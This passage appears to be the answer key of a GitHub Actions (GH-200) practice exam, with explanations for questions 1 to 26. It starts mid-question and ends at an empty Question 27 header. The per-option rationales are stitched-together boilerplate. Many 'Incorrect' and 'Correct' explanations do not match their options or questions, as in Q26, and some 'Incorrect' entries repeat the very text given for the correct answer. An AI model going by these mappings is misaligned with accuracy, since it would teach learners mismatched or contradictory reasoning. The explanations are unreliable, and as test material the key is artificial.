- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `on: schedule` (`POSIX cron` in UTC, minimum 5-minute interval) fires ONLY from workflow files present on the repository's default branch (`main`), so a cron workflow committed solely to `release/v4` never executes automatically.
- **C:** Incorrect. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **D:** Correct. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 2 — `A, C` (Author and manage workflows)

Correct answers: A and C (are correct). External HTTP `POST /repos/{owner}/{repo}/dispatches` payloads trigger `on: repository_dispatch: types: [eod-close]` (reading `github.event.client_payload`), while `on: workflow_dispatch` adds an interactive Actions UI Run workflow form with typed `inputs:`. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **E:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 3 — `B` (Author and manage workflows)

Correct answer: B (is correct). Top-level `concurrency:` with `group` and `cancel-in-progress: true` cancels in-flight runs in the same ref group when a newer commit arrives, while `paths-ignore: ['docs/**']` and `permissions: contents: read` enforce monorepo filtering and least privilege. [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 4 — `C, E` (Author and manage workflows)

Correct answers: C and E (are correct). Combining `branches` with `paths` requires BOTH filters to match (`logical AND`), and setting workflow-level `permissions: {}` drops unspecified `GITHUB_TOKEN` scopes to `none` while granting `packages: write` only to the specific job that declares it. [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **F:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 5 — `A` (Author and manage workflows)

Correct answer: A (is correct). A `workflow_dispatch` trigger supports `string`, `boolean`, `choice`, `environment`, and `number` (`max 10 inputs`), whereas `on: workflow_call` separates plaintext `inputs:` (`string`, `boolean`, `number`) from encrypted `secrets:` (`required: true/false` or `secrets: inherit`). [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.

### Question 6 — `D` (Author and manage workflows)

Correct answer: D (is correct). A reusable workflow (`on: workflow_call`) writes its step result to `$GITHUB_OUTPUT`, maps job `outputs:` to `on.workflow_call.outputs`, is invoked at `jobs.<id>.uses` (`@<sha>`) with `with:` and `secrets:`, and exposes outputs via `needs.<id>.outputs.<key>`. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. A reusable workflow fails without `on: workflow_call`, `$GITHUB_ENV` never crosses jobs, and passing secrets in `with:` leaks plaintext.
- **B:** Incorrect. `workflow_dispatch` cannot be called by `uses:`, `::set-output` is retired, and downstream jobs must `needs:` the reusable workflow job.
- **C:** Incorrect. Reusable workflows must live in `.github/workflows/`, be invoked at `jobs.<id>.uses` (not `steps:`), and map secrets/outputs explicitly.
- **D:** Correct. Reusable workflows map step `$GITHUB_OUTPUT` -> job `outputs` -> `on.workflow_call.outputs`, which caller jobs read via `needs.<id>.outputs`.

### Question 7 — `D` (Author and manage workflows)

Correct answer: D (is correct). Unlike `success() || failure()` (which skips on cancellation), `if: always()` runs even when the workflow run is canceled, and setting `timeout-minutes: 25` overrides GitHub's 360-minute default job timeout. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.

### Question 8 — `C` (Author and manage workflows)

Correct answer: C (is correct). On a step with `continue-on-error: true` that exits non-zero, `steps.<id>.outcome` records `'failure'` (the raw execution result), whereas `steps.<id>.conclusion` resolves to `'success'` after `continue-on-error` is applied. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 9 — `C` (Author and manage workflows)

Correct answer: C (is correct). Using `if: !cancelled()` on a downstream job with `needs:` allows it to run when upstream jobs succeed, fail, or skip, while still halting cleanly if a user or concurrency rule cancels the run. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 10 — `A` (Author and manage workflows)

Correct answer: A (is correct). Jobs without `needs:` (`lint` and `unit`) start in parallel on separate fresh runner VMs; `package` waits in a fan-in DAG until both `lint` and `unit` succeed, and `publish` runs only after `package` succeeds. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **C:** Incorrect. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 11 — `B` (Author and manage workflows)

Correct answer: B (is correct). Issuing `::add-mask::$TMP_SESSION` masks the dynamic value across subsequent log lines before usage, and appending `/opt/kestrel/bin` to `$GITHUB_PATH` prepends that directory to `PATH` for later steps in the same job. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.

### Question 12 — `A, C, F` (Author and manage workflows)

Correct answers: A, C, and F (are correct). Writing `name<<EOF ... EOF` heredocs to `$GITHUB_ENV` / `$GITHUB_OUTPUT` safely handles multi-line values (`replacing retired ::set-env and ::set-output`), `::error file=app.rs,line=42::msg` emits PR diff annotations, and writing Markdown to `$GITHUB_STEP_SUMMARY` (`<=1 MB/step`) publishes rich run summaries. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **F:** Correct. `$GITHUB_OUTPUT` paired with `jobs.<id>.outputs` is the supported mechanism for passing string metadata between separate jobs.

### Question 13 — `A` (Author and manage workflows)

Correct answer: A (is correct). Steps executing directly on the Linux runner VM host (outside a Docker job `container:`) cannot resolve service container hostnames on the Docker user bridge; they must publish `ports: ['6379:6379']` and connect via `localhost:6379`. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 14 — `A` (Author and manage workflows)

Correct answer: A (is correct). Declaring `services.postgres` with `--health-cmd pg_isready`, mapping `ports` (for host steps) or setting a job `container:`, waiting for Actions to mark `postgres` `healthy`, and dialing `localhost:5432` or `postgres:5432` eliminates startup races. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Correct. Service containers run `--health-cmd` probes and connect via `localhost:<port>` on host runners or `<label>:5432` inside job containers.
- **B:** Incorrect. Host-runner steps cannot resolve Docker bridge hostname `postgres` (`use mapped ports + localhost`), and skipping `--health-cmd` causes races.
- **C:** Incorrect. `services:` is a job-level key (never inside `steps:`), and steps inside a job `container:` dial `postgres:5432` over the Docker bridge.
- **D:** Incorrect. Service containers require Linux Docker runner hosts and are destroyed automatically when the single job finishes.

### Question 15 — `D` (Author and manage workflows)

Correct answer: D (is correct). GitHub Actions enforces a hard cap of `256` matrix jobs per workflow run, and setting `strategy.fail-fast: false` (`default is true`) allows sibling matrix jobs to run to completion even if one variant fails (`while windows-latest maps to Windows Server 2025`). [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.

### Question 16 — `C, E` (Author and manage workflows)

Correct answers: C and E (are correct). `exclude:` removes `{ os: windows-2025, dotnet: '8.0' }` leaving `3` total matrix jobs (`not 4 or 5`), and `include:` merges `coverage: true` onto the matching `{ os: ubuntu-24.04, dotnet: '9.0' }` entry while `max-parallel: 4` limits concurrent active matrix jobs. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **E:** Correct. `fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 17 — `A` (Author and manage workflows)

Correct answer: A (is correct). GitHub Actions supports standard YAML 1.1/1.2 anchors (`&name`), aliases (`*name`), and map merge keys (`<<: *name`) ONLY within the same single `.yml` workflow file; cross-file reuse requires Reusable Workflows or Composite Actions. [Skill 1.9: Simplify workflow definitions using YAML anchors and aliases within a workflow file | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 18 — `A` (Author and manage workflows)

Correct answer: A (is correct). The `secrets` context is NOT directly available in job-level `if:` expressions at workflow parse time; instead, pass a boolean from an upstream job output or test `env.HAS_WEBHOOK != ''` inside a step-level `if:` where `env:` binds `secrets.SLACK_WEBHOOK`. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 19 — `B` (Author and manage workflows)

Correct answer: B (is correct). Immutable Actions are published as immutable OCI packages in GitHub Container Registry (`GHCR` via `pkg.actions.githubusercontent.com` / `ghcr.io`), preventing post-release tag mutation while SHA pinning (`@<40-char-sha>`) guarantees cryptographic commit immutability. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **B:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 20 — `A` (Author and manage workflows)

Correct answer: A (is correct). `fromJSON()` parses a JSON string output into a structured array/object for dynamic `strategy.matrix` generation, and `hashFiles('**/Cargo.lock')` computes a deterministic SHA-256 digest across matching repository files. [Skill 1.11: Write expressions using built-in functions and conditional operators | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions)]

- **A:** Correct. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 21 — `B` (Author and manage workflows)

Correct answer: B (is correct). The official GitHub Actions extension for VS Code (`github.vscode-github-actions`) provides live workflow YAML schema validation, context/expression IntelliSense, `action.yml` input autocompletion, and run/log inspection before pushing commits. [Skill 1.12: Author and validate workflows using IDE extensions and developer tooling | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/quickstart)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.

### Question 22 — `A` (Author and manage workflows)

Correct answer: A (is correct). GitHub Actions enforces a `10 GB` default repository cache quota (`evicting oldest least-recently-used entries first once exceeded`) and automatically purges any cache entry not accessed within `7 days`, whereas artifacts persist until `retention-days` (`default 90d`) or `DELETE` API calls. [Skill 1.13: Configure dependency caching and manage workflow artifacts and retention | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)]

- **A:** Correct. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 23 — `D` (Author and manage workflows)

Correct answer: D (is correct). No — `$GITHUB_ENV` persists environment variables only for subsequent steps within the SAME job on the same runner VM; passing scalar values to downstream jobs requires `$GITHUB_OUTPUT` + job `outputs:` (`needs.prepare.outputs.batch_id`), or `upload-artifact@v4` for files. [Skill 1.14: Pass data between steps and jobs using outputs, environment variables, and artifacts | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs)]

- **A:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `$GITHUB_ENV` persists environment variables only for subsequent steps within the SAME job on the same runner VM; passing scalar values to downstream jobs requires `$GITHUB_OUTPUT` + job `outputs:` (`needs.prepare.outputs.batch_id`), or `upload-artifact@v4` for files.
- **C:** Incorrect. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **D:** Correct. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.

### Question 24 — `D` (Author and manage workflows)

Correct answer: D (is correct). Appending GitHub-flavored Markdown to `$GITHUB_STEP_SUMMARY` (`1 MB` per-step limit, isolated per step) renders tables on the run summary UI, and `.../actions/workflows/<file>.yml/badge.svg?branch=main&event=push` scopes the SVG status badge. [Skill 1.15: Publish job summaries and configure workflow status badges | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#adding-a-job-summary)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.

### Question 25 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). On `pull_request`, `GITHUB_REF` is `refs/pull/418/merge` and `GITHUB_SHA` points to the ephemeral test merge commit combining `aaa111` into `bbb222`, whereas on `push` `GITHUB_REF` is `refs/heads/feat/ach-v2` and `GITHUB_SHA` is the branch tip `aaa111`. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).

### Question 26 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). To prevent accidental infinite workflow loops, events generated using `GITHUB_TOKEN` do NOT trigger subsequent `on:` workflow runs (`except workflow_dispatch and repository_dispatch`); use a GitHub App installation token or fine-grained PAT when downstream triggers are intended. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **D:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.

### Question 27 — `B` (Consume and troubleshoot workflows)

